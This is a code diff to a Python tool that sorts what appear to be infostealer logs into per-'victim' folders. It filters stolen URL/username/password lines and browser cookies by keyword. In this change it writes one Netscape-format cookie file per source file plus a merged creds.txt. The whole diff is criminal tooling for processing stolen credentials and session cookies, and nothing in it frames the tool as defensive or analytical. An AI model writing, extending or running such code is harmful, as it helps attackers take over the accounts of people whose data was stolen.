@@ -17,6 +17,7 @@ from __future__ import annotations
 
 import argparse
 import contextlib
+import hashlib
 import json
 import os
 import re
@@ -29,7 +30,7 @@ from pathlib import Path
 from typing import Dict, Iterable, Iterator, List, Optional, Tuple
 from urllib.parse import urlparse
 
-__version__ = "0.7.0"
+__version__ = "0.8.0"
 
 # ---------------------------------------------------------------------------
 # Shared helpers
@@ -320,7 +321,7 @@ def source_name_for(path: Path, root: Path) -> str:
 
 def safe_source_name(name: str) -> str:
     cleaned = "".join(
-        c if c.isalnum() or c in "-_." else "_" for c in (name or "").strip()
+        c if c.isalnum() or c in "-_.[]()" else "_" for c in (name or "").strip()
     )
     return cleaned or "unknown"
 
@@ -717,31 +718,16 @@ def cmd_cookies(args: argparse.Namespace) -> int:
 def _sort_per_source(
     roots: List[Path], out_dir: Path, keywords: List[str]
 ) -> Dict[str, int]:
-    """Flat per-victim layout (keywords are filters, not folders)::
+    """Per-victim folder, one Netscape file per source cookie file::
 
-        out_dir/<victim>/cookies.txt + creds.txt
+        out_dir/<victim>/<orig_name>_<hash6>.txt   # one Netscape file per source
+        out_dir/<victim>/creds.txt                 # merged keyword-matching creds
     """
     out_dir.mkdir(parents=True, exist_ok=True)
     kws_lower = [k.lower() for k in keywords]
-    ulp_buf: Dict = {}
-    seen_ulp: Dict = {}
-    cookie_buf: Dict = {}
-    seen_cookie: Dict = {}
 
-    for r in roots:
-        for url, user, pwd, src_path in collect_credentials(r):
-            host = domain_of(url)
-            haystack = (url + " " + host).lower()
-            if not any(k in haystack for k in kws_lower):
-                continue
-            src = safe_source_name(source_name_for(src_path, r))
-            line = f"{url}:{user}:{pwd}"
-            seen = seen_ulp.setdefault(src, set())
-            if line in seen:
-                continue
-            seen.add(line)
-            ulp_buf.setdefault(src, []).append(line)
-
+    by_file: Dict[Tuple[str, Path], List[Dict]] = {}
+    by_file_root: Dict[Tuple[str, Path], Path] = {}
     for r in roots:
         for cookie, src_path in collect_cookies_with_source(r):
             domain = (cookie.get("domain") or "").lower()
@@ -749,32 +735,63 @@ def _sort_per_source(
                 continue
             if not any(k in domain for k in kws_lower):
                 continue
-            src = safe_source_name(source_name_for(src_path, r))
-            line = to_netscape_line(cookie)
-            seen = seen_cookie.setdefault(src, set())
-            if line in seen:
+            victim = safe_source_name(source_name_for(src_path, r))
+            key = (victim, src_path)
+            by_file.setdefault(key, []).append(cookie)
+            by_file_root.setdefault(key, r)
+
+    cookie_files_written = 0
+    cookies_total = 0
+    for (victim, src_path), cookies in by_file.items():
+        deduped = dedupe_cookies(cookies)
+        if not deduped:
+            continue
+        r = by_file_root[(victim, src_path)]
+        try:
+            rel = src_path.resolve().relative_to(r.resolve())
+            hash_input = str(rel)
+        except ValueError:
+            hash_input = str(src_path)
+        h = hashlib.sha1(hash_input.encode("utf-8")).hexdigest()[:6]
+        fname = safe_source_name(f"{src_path.name}_{h}") + ".txt"
+        target_dir = out_dir / victim
+        target_dir.mkdir(parents=True, exist_ok=True)
+        with open(target_dir / fname, "w", encoding="utf-8") as f:
+            f.write(NETSCAPE_HEADER)
+            for c in deduped:
+                f.write(to_netscape_line(c) + "\n")
+        cookie_files_written += 1
+        cookies_total += len(deduped)
+
+    ulp_buf: Dict[str, List[str]] = {}
+    seen_ulp: Dict[str, set] = {}
+    for r in roots:
+        for url, user, pwd, src_path in collect_credentials(r):
+            host = domain_of(url)
+            haystack = (url + " " + host).lower()
+            if not any(k in haystack for k in kws_lower):
                 continue
-            seen.add(line)
-            cookie_buf.setdefault(src, []).append(line)
+            victim = safe_source_name(source_name_for(src_path, r))
+            line = f"{url}:{user}:{pwd}"
+            s = seen_ulp.setdefault(victim, set())
+            if line in s:
+                continue
+            s.add(line)
+            ulp_buf.setdefault(victim, []).append(line)
 
-    victims = set(ulp_buf) | set(cookie_buf)
-    for src in victims:
-        d = out_dir / src
+    for victim, lines in ulp_buf.items():
+        d = out_dir / victim
         d.mkdir(parents=True, exist_ok=True)
-        if src in ulp_buf:
-            (d / "creds.txt").write_text(
-                "\n".join(ulp_buf[src]) + "\n", encoding="utf-8"
-            )
-        if src in cookie_buf:
-            with open(d / "cookies.txt", "w", encoding="utf-8") as f:
-                f.write(NETSCAPE_HEADER)
-                for ln in cookie_buf[src]:
-                    f.write(ln + "\n")
+        (d / "creds.txt").write_text(
+            "\n".join(lines) + "\n", encoding="utf-8"
+        )
 
+    victims = set(ulp_buf) | {v for v, _ in by_file}
     return {
         "victims": len(victims),
         "ulp": sum(len(v) for v in ulp_buf.values()),
-        "cookies": sum(len(v) for v in cookie_buf.values()),
+        "cookie_files": cookie_files_written,
+        "cookies": cookies_total,
     }
 
 
@@ -795,7 +812,8 @@ def cmd_sort(args: argparse.Namespace) -> int:
             s = _sort_per_source(roots, Path(args.output), keywords)
             print(
                 f"  {s['victims']} hit(s), {s['ulp']} ulp, "
-                f"{s['cookies']} cookies",
+                f"{s['cookie_files']} cookie file(s) "
+                f"({s['cookies']} cookies)",
                 file=sys.stderr,
             )
             return 0
